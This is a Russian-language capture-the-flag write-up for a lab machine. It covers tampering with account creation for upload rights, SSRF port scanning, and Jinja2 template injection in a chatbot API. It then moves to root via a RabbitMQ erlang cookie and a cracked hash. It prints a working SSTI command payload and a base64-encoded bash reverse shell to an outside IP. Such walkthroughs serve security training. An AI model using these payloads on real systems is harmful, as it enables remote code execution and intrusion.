


![[../attachment/Pasted image 20250408110553.png]]
для доступа к сайту добавим target ip и domain в /etc/hosts
Исследуя сайт находим поддомен storage, который добавляем в etc/hosts
Создаем пользователя и видим уведомление
![[../attachment/Pasted image 20250408111449.png]]

при регистрации был создан jwt token

![[../attachment/Pasted image 20250408112245.png]]

Возвращаемся к созданию учетную записи и добавляем строку  "subscription":"active"


![[../attachment/Pasted image 20250408112846.png]]
![[../attachment/Pasted image 20250408112854.png]]

После входа под новым пользователем мы получаем доступ  к загрузке файлов
![[../attachment/Pasted image 20250408112938.png]]
Попробуем загрузить png и проверить наличие уязвимости при загрузке файла (отсутствует)
![[../attachment/Pasted image 20250408113153.png]]

Сайт обращался к api (logout,register,uploads....) - проверим какие есть еще
![[../attachment/Pasted image 20250408113727.png]]

Доступа к api/docs запрещен 

На главной странице также есть загрузка через url
![[../attachment/Pasted image 20250408113834.png]]![[../attachment/Pasted image 20250408113921.png]]
![[../attachment/Pasted image 20250408115952.png]]
при просмотре файла ничего не найдено. Скорее всего есть другой порт, выполним поиск с помощью burp где будем менять значения порта от 80-N (первый поиск до 8390)
![[../attachment/Pasted image 20250408120057.png]]

После поиска сортируем по длине ответа и порт 3000 имеет наибольшею длину после 80 порта
Загружаем на сайт url http://127.0.0.1:3000/api/docs и получает путь к файлу в котором содержатся эндпоинты
![[../attachment/Pasted image 20250408120409.png]]

отправим POST запрос на api chatbot
![[../attachment/Pasted image 20250408122019.png]]![[../attachment/Pasted image 20250408122049.png]]
Проверим наличие SSTI
![[../attachment/Pasted image 20250408122108.png]]
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} ([Flask Jinja2 Pentesting | Exploit Notes](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/))
![[../attachment/Pasted image 20250408125048.png]]
генерируем с помощью revshell нагрузку bash и кодируем в base64 
```
"{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIxLjYxLjM1LzY2NTUgMD4mMQ==|base64 -d|bash').read()}}"
```

подключаемся и забираем первый флаг
![[../attachment/Pasted image 20250408181414.png]]

При сканирование машины был сервис rabbit. Проверим домашнюю директорию пользователя rabbitmq (создается автоматически при установки rabbit)
![[../attachment/Pasted image 20250408181542.png]]
Получив куки erlang можно подключиться и экспортировать метаданные(definitions) 
Находим в них хеш root и декодируем 
![[../attachment/Pasted image 20250408181718.png]]

![[../attachment/Pasted image 20250408182056.png]]

Забираем флаг root
![[../attachment/Pasted image 20250408182217.png]]